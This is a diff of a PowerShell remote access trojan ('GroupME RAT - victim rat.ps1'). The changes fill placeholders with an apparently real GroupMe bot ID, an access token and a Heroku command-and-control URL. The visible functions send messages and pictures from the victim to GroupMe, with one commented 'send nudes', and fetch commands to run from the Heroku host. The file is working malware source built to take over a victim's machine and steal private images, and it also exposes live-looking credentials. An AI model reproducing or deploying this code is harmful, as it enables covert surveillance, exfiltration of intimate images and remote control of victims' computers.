@@ -1,4 +1,4 @@
- # rat.ps1
+  # rat.ps1
 # By: Bryton Herdes
 # GroupME RAT - victim rat.ps1
 
@@ -9,7 +9,7 @@ function sendmsg() {
     $Url="https://api.groupme.com/v3/bots/post"
     $Body= @{
             text="$cmd"
-            bot_id="YOUR BOT ID"
+            bot_id="688958bd70cfbf125a71291636"
             }
     Invoke-RestMethod -Method POST -Uri $Url -Body $Body
 }
@@ -17,7 +17,7 @@ function sendmsg() {
 #send nudes
 function sendpics() {
     $Url = "https://image.groupme.com/pictures"
-    $GM_TOKEN = "YOUR GM TOKEN"
+    $GM_TOKEN = "bf0c57c0007e0136a2db7fb5bd43c247"
     $content = "image/jpeg"
     $dict = @{}
     $dict.Add("X-Access-Token","$GM_TOKEN")
@@ -33,7 +33,7 @@ function sendpics() {
 # Function for getting the command to run and send 
 function getcmd() {
     # Send Invoke-RestMethod Portion #
-    $Url="YOUR HERKU APP URL TO POST TO" #example.herokuapp.com/post
+    $Url="https://rat-groupme.herokuapp.com/post"
     $Body= @{
             "name"="target"
             "text"="yea let's try"
@@ -132,4 +132,5 @@ foreach ($d in $all) {
     }  
 }
 
-} 
+}  
+
